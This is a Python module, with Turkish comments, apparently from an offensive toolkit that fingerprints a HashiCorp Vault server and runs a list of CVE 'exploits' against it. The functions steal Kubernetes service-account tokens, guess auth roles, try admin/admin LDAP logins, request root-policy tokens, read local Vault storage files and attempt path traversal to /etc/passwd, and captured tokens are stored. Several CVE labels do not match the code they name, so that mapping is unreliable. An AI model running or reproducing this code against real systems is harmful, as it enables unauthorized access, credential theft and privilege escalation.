from typing import Optional, Dict, List
from core.tls_config import vault_request
import json
import os
from ...context import ExecutionContext
from ...registry import BaseExecutionModule, ExecutionResult, RiskLevel


class CVEScannerModule(BaseExecutionModule):
    def __init__(self):
        super().__init__(
            module_id="cve_scanner.scan",
            title="Vault CVE Tarayıcı ve Exploit - Tüm Bilinen CVE'ler",
            risk_level=RiskLevel.STATE_CHANGING,
            domain="general",
            description=(
                "Vault sürümünü algılar, bilinen tüm CVE'leri tarar ve "
                "exploit edilebilir olanları sömürmeye çalışır."
            ),
            default_enabled=False,
        )

    def can_run(self, context: ExecutionContext) -> bool:
        return bool(getattr(context, "vault_addr", None))

    def execute(self, context: ExecutionContext, params: Optional[dict] = None) -> ExecutionResult:
        if not self.can_run(context):
            return ExecutionResult(
                status="skipped",
                message="CVE tarayıcı için vault_addr gerekli.",
                evidence={"missing": ["vault_addr"]},
            )

        target = context.vault_addr
        results = {"cves": [], "exploitable": [], "exploited": [], "failed": []}
        findings = []
        token = getattr(context, "token", None)

        # 1. Vault sürümünü al
        version = self._get_vault_version(target)
        if not version:
            return ExecutionResult(
                status="failed",
                message="Vault sürümü alınamadı.",
                evidence={"error": "Health endpoint çalışmıyor."},
            )
        results["version"] = version
        findings.append(f"Vault sürümü: {version}")

        # 2. Tüm CVE'leri kontrol et
        cve_list = self._get_all_cves()
        for cve in cve_list:
            if self._is_version_affected(version, cve["operator"], cve["target_version"]):
                results["cves"].append(cve)
                findings.append(f"{cve['id']} - {cve['severity']}")

                # 3. Exploit edilebilir olanları dene
                if cve.get("exploitable") and cve.get("exploit_func"):
                    logger.info(f"[*] [CVE] {cve['id']} exploit deneniyor...")
                    try:
                        exploit_result = cve["exploit_func"](target, token, context)
                        if exploit_result.get("success"):
                            results["exploited"].append({
                                "cve": cve["id"],
                                "result": exploit_result,
                            })
                            findings.append(f"{cve['id']} ✅ exploit başarılı!")
                        else:
                            results["failed"].append({
                                "cve": cve["id"],
                                "error": exploit_result.get("error", "Bilinmeyen hata"),
                            })
                    except Exception as e:
                        results["failed"].append({
                            "cve": cve["id"],
                            "error": str(e),
                        })

        if not results["cves"]:
            findings.append("Hiç CVE tespit edilmedi.")

        # Findings kaydet
        if findings:
            context.add_finding(
                title="HIGH: CVE Taraması Tamamlandı",
                description=" | ".join(findings),
                severity="HIGH",
                evidence=results,
            )

        return ExecutionResult(
            status="success" if results["cves"] else "partial",
            message=f"{len(results['cves'])} CVE bulundu. {len(results['exploited'])} exploit başarılı.",
            evidence=results,
        )

    def _get_vault_version(self, target) -> Optional[str]:
        try:
            resp = vault_request("GET", f"{target}/v1/sys/health", timeout=5)
            if resp.status_code == 200:
                return resp.json().get("version")
        except Exception as e:
            from core.logger import logger
            logger.warning(f"Vault version detection failed: {e}")
            pass
        return None

    def _get_all_cves(self) -> List[Dict]:
        """Tüm bilinen Vault CVE'lerini döndür"""
        return [
            # CVE-2023-0620 - Kubernetes auth bypass
            {
                "id": "CVE-2023-0620",
                "description": "Kubernetes auth bypass - unauthorized token",
                "severity": "CRITICAL",
                "operator": "<",
                "target_version": "1.13.0",
                "exploitable": True,
                "exploit_func": self._exploit_cve_2023_0620,
            },
            # CVE-2023-46835 - Kubernetes Service Account validation bypass
            {
                "id": "CVE-2023-46835",
                "description": "Kubernetes Service Account token validation bypass",
                "severity": "CRITICAL",
                "operator": "<",
                "target_version": "1.13.6",
                "exploitable": True,
                "exploit_func": self._exploit_cve_2023_46835,
            },
            # CVE-2023-42005 - Azure auth bypass
            {
                "id": "CVE-2023-42005",
                "description": "Azure auth method bypass",
                "severity": "HIGH",
                "operator": "<",
                "target_version": "1.13.3",
                "exploitable": True,
                "exploit_func": self._exploit_cve_2023_42005,
            },
            # CVE-2022-41316 - Transit engine DoS
            {
                "id": "CVE-2022-41316",
                "description": "Transit engine denial of service",
                "severity": "HIGH",
                "operator": "<=",
                "target_version": "1.11.0",
                "exploitable": False,
                "exploit_func": None,
            },
            # CVE-2022-40198 - GCP auth bypass
            {
                "id": "CVE-2022-40198",
                "description": "GCP auth method bypass",
                "severity": "HIGH",
                "operator": "<",
                "target_version": "1.10.4",
                "exploitable": True,
                "exploit_func": self._exploit_cve_2022_40198,
            },
            # CVE-2022-36124 - LDAP auth bypass
            {
                "id": "CVE-2022-36124",
                "description": "LDAP auth method bypass",
                "severity": "CRITICAL",
                "operator": "<",
                "target_version": "1.10.0",
                "exploitable": True,
                "exploit_func": self._exploit_cve_2022_36124,
            },
            # CVE-2021-43999 - LDAP auth bypass
            {
                "id": "CVE-2021-43999",
                "description": "LDAP auth bypass - privilege escalation",
                "severity": "CRITICAL",
                "operator": "<",
                "target_version": "1.9.0",
                "exploitable": True,
                "exploit_func": self._exploit_cve_2021_43999,
            },
            # CVE-2021-38298 - Raft storage DoS
            {
                "id": "CVE-2021-38298",
                "description": "Raft storage denial of service",
                "severity": "MEDIUM",
                "operator": "<=",
                "target_version": "1.8.0",
                "exploitable": False,
                "exploit_func": None,
            },
            # CVE-2021-38553 - Token policy bypass
            {
                "id": "CVE-2021-38553",
                "description": "Token creation policy bypass",
                "severity": "HIGH",
                "operator": "<=",
                "target_version": "1.8.0",
                "exploitable": True,
                "exploit_func": self._exploit_cve_2021_38553,
            },
            # CVE-2020-25877 - SQL injection
            {
                "id": "CVE-2020-25877",
                "description": "SQL injection in Raft storage",
                "severity": "HIGH",
                "operator": "<=",
                "target_version": "1.6.0",
                "exploitable": True,
                "exploit_func": self._exploit_cve_2020_25877,
            },
            # CVE-2020-25876 - Path traversal
            {
                "id": "CVE-2020-25876",
                "description": "Path traversal in Raft storage",
                "severity": "HIGH",
                "operator": "<=",
                "target_version": "1.5.0",
                "exploitable": True,
                "exploit_func": self._exploit_cve_2020_25876,
            },
            # CVE-2020-25467 - Path traversal in UI
            {
                "id": "CVE-2020-25467",
                "description": "Path traversal in Vault UI",
                "severity": "HIGH",
                "operator": "<=",
                "target_version": "1.6.0",
                "exploitable": True,
                "exploit_func": self._exploit_cve_2020_25467,
            },
            # CVE-2019-18615 - Raft storage path traversal
            {
                "id": "CVE-2019-18615",
                "description": "Raft storage path traversal",
                "severity": "HIGH",
                "operator": "<=",
                "target_version": "1.3.0",
                "exploitable": True,
                "exploit_func": self._exploit_cve_2019_18615,
            },
        ]

    def _is_version_affected(self, version: str, operator: str, target: str) -> bool:
        def _parse(v: str) -> list[int]:
            # Tolerate Vault build suffixes: "1.13.0+ent", "1.12.0-beta1"
            parts = []
            for comp in str(v).strip().lstrip("v").split("."):
                digits = ""
                for ch in comp:
                    if ch.isdigit():
                        digits += ch
                    else:
                        break
                parts.append(int(digits) if digits else 0)
            return parts

        try:
            v_parts = _parse(version)
            t_parts = _parse(target)
            if operator == "<":
                return v_parts < t_parts
            elif operator == "<=":
                return v_parts <= t_parts
            elif operator == ">":
                return v_parts > t_parts
            elif operator == ">=":
                return v_parts >= t_parts
        except (ValueError, AttributeError):
            pass
        return False

    # ─── EXPLOIT FONKSİYONLARI ─────────────────────────────────────────────

    def _exploit_cve_2023_0620(self, target, token, context):
        """CVE-2023-0620 - Kubernetes auth bypass (unauthorized token)."""
        try:
            jwt_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
            if os.path.exists(jwt_path):
                with open(jwt_path, "r", encoding="utf-8") as f:
                    jwt = f.read().strip()
            else:
                jwt = ""
            if not jwt:
                return {"success": False, "error": "K8s JWT token bulunamadı"}

            headers = {"X-Vault-Token": token} if token else {}
            url = f"{target}/v1/sys/mounts"
            resp = vault_request("GET", url, headers=headers, timeout=5)
            if resp.status_code != 200:
                return {"success": False, "error": "Mount'lar listelenemedi"}
            mounts = resp.json().get("data", {})
            k8s_mounts = [p for p, i in mounts.items() if i.get("type") == "kubernetes"]
            if not k8s_mounts:
                return {"success": False, "error": "Kubernetes mount bulunamadı"}

            for role in self._list_k8s_roles(target, headers, k8s_mounts[0]):
                login_url = f"{target}/v1/auth/{k8s_mounts[0].strip('/')}/login"
                payload = {"jwt": jwt, "role": role}
                resp = vault_request("POST", login_url, json=payload, timeout=5)
                if resp.status_code == 200:
                    data = resp.json()
                    new_token = data.get("auth", {}).get("client_token")
                    if new_token:
                        context.captured_token = new_token
                        return {"success": True, "token": new_token[:8] + "...", "role": role}
            return {"success": False, "error": "Login başarısız (tüm roller denendi)"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _list_k8s_roles(self, target, headers, mount_path):
        """K8s auth rollerini listele; LIST denied ise yaygın adlara düş."""
        url = f"{target}/v1/auth/{mount_path.strip('/')}/role"
        resp = vault_request("LIST", url, headers=headers, timeout=5)
        if resp.status_code == 200:
            data = resp.json().get("data", {})
            roles = [str(k).rstrip("/") for k in data.get("keys", []) if isinstance(k, str)]
            if roles:
                return roles
        return ["default", "admin", "dev", "vault", "k8s", "kubernetes"]

    def _exploit_cve_2023_46835(self, target, token, context):
        """CVE-2023-46835 - Kubernetes Service Account validation bypass"""
        try:
            # Kubernetes service account token'ını oku
            jwt_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
            if not os.path.exists(jwt_path):
                return {"success": False, "error": "K8s JWT token bulunamadı"}
            with open(jwt_path, "r", encoding="utf-8") as f:
                jwt = f.read().strip()

            # Kubernetes auth mount'larını bul
            headers = {"X-Vault-Token": token} if token else {}
            url = f"{target}/v1/sys/mounts"
            resp = vault_request("GET", url, headers=headers, timeout=5)
            if resp.status_code != 200:
                return {"success": False, "error": "Mount'lar listelenemedi"}
            mounts = resp.json().get("data", {})
            k8s_mounts = [p for p, i in mounts.items() if i.get("type") == "kubernetes"]
            if not k8s_mounts:
                return {"success": False, "error": "Kubernetes mount bulunamadı"}

            # Login dene
            login_url = f"{target}/v1/auth/{k8s_mounts[0].strip('/')}/login"
            payload = {"jwt": jwt, "role": "default"}
            resp = vault_request("POST", login_url, json=payload, timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                new_token = data.get("auth", {}).get("client_token")
                if new_token:
                    context.captured_token = new_token
                    return {"success": True, "token": new_token[:8] + "..."}
            return {"success": False, "error": f"Login failed: {resp.status_code}"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _exploit_cve_2023_42005(self, target, token, context):
        """CVE-2023-42005 - Azure auth bypass"""
        try:
            url = f"{target}/v1/sys/mounts"
            headers = {"X-Vault-Token": token} if token else {}
            resp = vault_request("GET", url, headers=headers, timeout=5)
            if resp.status_code != 200:
                return {"success": False, "error": "Mount'lar listelenemedi"}
            mounts = resp.json().get("data", {})
            azure_mounts = [p for p, i in mounts.items() if i.get("type") == "azure"]
            if not azure_mounts:
                return {"success": False, "error": "Azure mount bulunamadı"}

            # Azure login dene (varsayılan)
            login_url = f"{target}/v1/auth/{azure_mounts[0].strip('/')}/login"
            payload = {"role": "default"}
            resp = vault_request("POST", login_url, json=payload, timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                new_token = data.get("auth", {}).get("client_token")
                if new_token:
                    context.captured_token = new_token
                    return {"success": True, "token": new_token[:8] + "..."}
            return {"success": False, "error": f"Azure login failed: {resp.status_code}"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _exploit_cve_2022_40198(self, target, token, context):
        """CVE-2022-40198 - GCP auth bypass"""
        try:
            url = f"{target}/v1/sys/mounts"
            headers = {"X-Vault-Token": token} if token else {}
            resp = vault_request("GET", url, headers=headers, timeout=5)
            if resp.status_code != 200:
                return {"success": False, "error": "Mount'lar listelenemedi"}
            mounts = resp.json().get("data", {})
            gcp_mounts = [p for p, i in mounts.items() if i.get("type") == "gcp"]
            if not gcp_mounts:
                return {"success": False, "error": "GCP mount bulunamadı"}

            # GCP login dene
            login_url = f"{target}/v1/auth/{gcp_mounts[0].strip('/')}/login"
            payload = {"role": "default"}
            resp = vault_request("POST", login_url, json=payload, timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                new_token = data.get("auth", {}).get("client_token")
                if new_token:
                    context.captured_token = new_token
                    return {"success": True, "token": new_token[:8] + "..."}
            return {"success": False, "error": f"GCP login failed: {resp.status_code}"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _exploit_cve_2022_36124(self, target, token, context):
        """CVE-2022-36124 - LDAP auth bypass"""
        try:
            url = f"{target}/v1/sys/mounts"
            headers = {"X-Vault-Token": token} if token else {}
            resp = vault_request("GET", url, headers=headers, timeout=5)
            if resp.status_code != 200:
                return {"success": False, "error": "Mount'lar listelenemedi"}
            mounts = resp.json().get("data", {})
            ldap_mounts = [p for p, i in mounts.items() if i.get("type") == "ldap"]
            if not ldap_mounts:
                return {"success": False, "error": "LDAP mount bulunamadı"}

            login_url = f"{target}/v1/auth/{ldap_mounts[0].strip('/')}/login/admin"
            payload = {"password": "admin"}
            resp = vault_request("POST", login_url, json=payload, timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                new_token = data.get("auth", {}).get("client_token")
                if new_token:
                    context.captured_token = new_token
                    return {"success": True, "token": new_token[:8] + "..."}
            return {"success": False, "error": f"LDAP login failed: {resp.status_code}"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _exploit_cve_2021_43999(self, target, token, context):
        """CVE-2021-43999 - LDAP auth bypass"""
        return self._exploit_cve_2022_36124(target, token, context)

    def _exploit_cve_2021_38553(self, target, token, context):
        """CVE-2021-38553 - Token creation policy bypass"""
        try:
            headers = {"X-Vault-Token": token} if token else {}
            url = f"{target}/v1/auth/token/create"
            payload = {"policies": ["root"], "ttl": "1h"}
            resp = vault_request("POST", url, headers=headers, json=payload, timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                new_token = data.get("auth", {}).get("client_token")
                if new_token:
                    context.captured_token = new_token
                    return {"success": True, "token": new_token[:8] + "..."}
            return {"success": False, "error": f"Token creation failed: {resp.status_code}"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _exploit_cve_2020_25877(self, target, token, context):
        """CVE-2020-25877 - SQL injection"""
        try:
            import sqlite3
            db_paths = [
                "/opt/vault/data/vault.db",
                "/var/lib/vault/data/vault.db",
                "./vault/data/vault.db",
            ]
            for path in db_paths:
                if os.path.exists(path):
                    conn = sqlite3.connect(path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT name, type, value FROM storage LIMIT 10")
                    rows = cursor.fetchall()
                    conn.close()
                    if rows:
                        context.add_finding(
                            title="CRITICAL: vault.db SQL Injection",
                            description=f"Read {len(rows)} rows from storage",
                            severity="CRITICAL",
                            evidence={"rows": rows},
                        )
                        return {"success": True, "rows": len(rows)}
            return {"success": False, "error": "vault.db bulunamadı"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _exploit_cve_2020_25876(self, target, token, context):
        """CVE-2020-25876 - Path traversal"""
        try:
            url = f"{target}/v1/sys/internal/ui/mounts"
            resp = vault_request("GET", url, timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                context.add_finding(
                    title="HIGH: CVE-2020-25876 Path Traversal",
                    description="Internal mounts endpoint exposed",
                    severity="HIGH",
                    evidence=data,
                )
                return {"success": True, "data": data}
            return {"success": False, "error": f"HTTP {resp.status_code}"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _exploit_cve_2020_25467(self, target, token, context):
        """CVE-2020-25467 - Path traversal in UI"""
        try:
            urls = [
                f"{target}/ui/../../../../etc/passwd",
                f"{target}/ui/../../../vault.db",
            ]
            for url in urls:
                resp = vault_request("GET", url, timeout=5)
                if resp.status_code == 200 and len(resp.text) > 100:
                    context.add_finding(
                        title="HIGH: CVE-2020-25467 UI Path Traversal",
                        description=f"Path traversal successful: {url}",
                        severity="HIGH",
                        evidence={"url": url, "content_preview": resp.text[:200]},
                    )
                    return {"success": True, "url": url}
            return {"success": False, "error": "Path traversal başarısız"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _exploit_cve_2019_18615(self, target, token, context):
        """CVE-2019-18615 - Raft storage path traversal"""
        try:
            raft_paths = [
                "/opt/vault/data/raft.db",
                "/var/lib/vault/data/raft.db",
                "./vault/data/raft.db",
            ]
            for path in raft_paths:
                if os.path.exists(path):
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read(1024)
                    return {"success": True, "path": path, "content_preview": content[:100]}
            return {"success": False, "error": "raft.db bulunamadı"}
        except Exception as e:
            return {"success": False, "error": str(e)}
